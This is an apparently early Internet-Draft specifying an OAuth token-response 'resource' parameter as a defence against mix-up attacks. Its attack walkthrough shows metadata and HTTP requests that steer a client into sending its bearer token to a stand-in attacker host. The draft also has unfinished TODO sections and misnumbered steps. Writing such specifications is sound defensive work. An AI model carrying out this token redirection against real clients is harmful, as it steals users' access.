---
title: OAuth 2.0 Intended Resource Identification
abbrev: Intended Resource Identification
category: std

docname: draft-hanson-oauth-resource-token-resp-latest
submissiontype: IETF
number:
date:
consensus: true
v: 3
area: Security
workgroup: Web Authorization Protocol
keyword:
  - oauth
venue:
  group: Web Authorization Protocol
  type: Working Group
  mail: oauth@ietf.org
  github: jaredhanson/oauth-resource-token-resp

author:
  - name: Jared Hanson
    org: Keycard
    email: jared@keycard.ai

informative:
  MCP:
    title: Model Context Protocol
    target: https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization
  Mastodon:
    title: Mastodon
    target: https://docs.joinmastodon.org/spec/oauth/
  ATProto:
    title: AT Protocol
    target: https://atproto.com/specs/oauth

--- abstract

This document specifies a new parameter `resource` that is used to explicitly
include the resource identifier of the protected resource that the access token
in the token response is intended for.  This `resource` parameter serves as an
effective countermeasure to "mix-up attacks".

--- middle

# Introduction

In traditional OAuth deployments, there is typically a pre-known relationship
between authorization servers and the resource servers they protect.  Clients
that request access to protected resources are manually registered ahead of
time and understand the relationship between issued access tokens and the
protected resources for which those tokens are intended.

As OAuth evolves to support more loosely-coupled deployments, clients are
dynamically discovering configuration using OAuth 2.0 Protected Resource Metadata
{{!RFC9728}} and OAuth 2.0 Authorization Server Metadata {{!RFC8414}} and
registering using OAuth 2.0 Dynamic Client Registration Protocol {{!RFC7591}}.
Networks utilizing dynamic configuration include Model Context Protocol {{MCP}},
Mastodon {{Mastodon}}, and AT Protocol {{ATProto}}.

The token response of OAuth 2.0 does not include any information about the
identity of the intended recipient of the access token issued in the response.
Therefore, clients receiving an access token from the authorization server
cannot be sure which resource(s) the token is intended for.  The lack of
certainty about the intended receipient of a access token enables a class of
attacks called "mix-up attacks".

Mix-up attacks are a potential threat to all OAuth clients that interact with
dynamically discovered resource servers.  When a resource servers is under an
attacker's control, the attacker can launch a mix-up attack to acquire access
tokens issued by a vulnerable authorization server.

OAuth clients that interact with resource servers in a manner in which the
authorization server is statically configured are not vulnerable to mix-up
attacks.  However, when such clients interact with dynamically configured
resource servers and authorization servers, they become vulnerable and need
to apply countermeasures to mitigate mix-up attacks.

Mix-up attacks aim to steal access tokens by tricking the client into sending
the access token to the attacker instead of the intended resource server.  This
marks a severe threat to the confidentiality and integrity of resources whose
access is managed with OAuth.

This document defines a new parameter in the token response called `resource`.
The `resource` parameter allows the authorization server to explicitly include
the identity of the protected resource(s) for which the access token is
intended.  The client can compare the value of the `resource` parameter to the
resource identifier of the protected resource (e.g., retrieved from its
metadata) it believes it is interacting with.  The `resource` parameter gives
the client certainty about the protected resource(s) for which the access token
is intended and enables it to send access tokens only to the intended
recipients.  Therefore, the implementation of the `resource` parameter serves as
an effective countermeasure to mix-up attacks.

# Response Parameter resource

In token responses to the client, an authorization server supporting this
specification MUST indicate the identity of the protected resource(s) for which
the access token is intended by including the `resource` parameter in the
response.

The `resource` parameter value is the resource identifier of the protected
resource(s) for which the access token is intended, as defined by [Section 2](https://datatracker.ietf.org/doc/html/rfc8707#name-resource-parameter)
of {{!RFC8707}}.  In the general
case, the `resource` parameter is an array of strings, each containing a
resource identifier.  In the special case when the access token is intended for
a single protected resource, the `resource` parameter MAY be a string.

## Example Token Response

The following example shows a token response from the authorizaiton server
where the access token is intended for the resource whose resource identifier is
`https://rs.example.com/`:

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

{
  "access_token":"2YotnFZFEjr1zCsicMWpAA",
  "token_type":"example",
  "expires_in":3600,
  "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
  "resource":"https://rs.example.com/"
}

## Providing the Resource Identifier

Resource servers supporting this specification MUST provide their resource
identifier to enable clients to validate the `resource` parameter effectively.
The recommended approach is [RFC9728](https://datatracker.ietf.org/doc/html/rfc9728).

TODO: Clarify this section.

## Validating the Resource Identifier

TODO: Add this section.

More precisely, clients that interact with resource servers
...

# Authorization Server Metadata

The following parameter for the authorization server metadata [RFC8414](https://datatracker.ietf.org/doc/html/rfc8414)
is introduced to signal the authorization server's support for this
specification:

`token_response_resource_parameter_supported`: Boolean parameter indicating
whether the authorization server provides the `resource` parameter in the token
response as defined in Section 2.  If omitted, the default value is false.

# Attack Goals


In this attack, an attacker tricks a client into sending an access token to the
attacker instead of the honest resource server.

# Attack Description

The access token mix-up attack works as follows:

1. The attacker sets up a malicious resource server (https://rs.attacker.example).

2. The malicious resource server publishes metadata indicating that a victim
   authorization server (https://as.victim.example) protects this resource server.
   For example:

   {
      "resource":
        "https://rs.attacker.example",
      "authorization_servers":
        ["https://as.victim.example"]
   }

3. The attacker tricks a legitimate client into connecting to the malicious
   resource server, which challenges the client to authorize using the
   dynamically discovered metadata.   For example:

   HTTP/1.1 401 Unauthorized
   WWW-Authenticate: Bearer resource_metadata=
     "https://rs.attacker.example/.well-known/oauth-protected-resource"

4. The legitimate client sends an authorization request to the victim authorization
   server

   GET /authorize?response_type=code
        &client_id=example-client
        &state=XzZaJlcwYew1u0QBrRv_Gw
        &redirect_uri=https%3A%2F%2Fclient.example.org%2Fcb
        &resource=https%3A%2F%2Frs.attacker.example HTTP/1.1
  Host: as.victim.example

5. The victim authorization server, which does not support resource indidicators,
   receives this request and processes it according to pre-defined set of scope
   for a victim protected resource (https://rs.victim.example).

6. The user consents to authorize the legitimate client access to the victim protected
   resource.

7. The victim authorization server issues an access token to the legitimate client,
   granting it access to the vicitim protected resource.  For example:

   HTTP/1.1 200 OK
   Content-Type: application/json

   {
     "access_token":"mF_9.B5f-4.1JqM",
     "token_type":"Bearer",
     "expires_in":3600,
     "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA"
   }

7. The legitimate client utilized the access token to make a request to the malicious
   resource server.  For example:

   GET / HTTP/1.1
   Host: rs.attacker.example
   Authorization: Bearer mF_9.B5f-4.1JqM

8. The malicious resource server is now in posession of an access token it can use
   to make authorized requests to the victim resource server.


// https://datatracker.ietf.org/doc/html/rfc9728#name-audience-restricted-access-
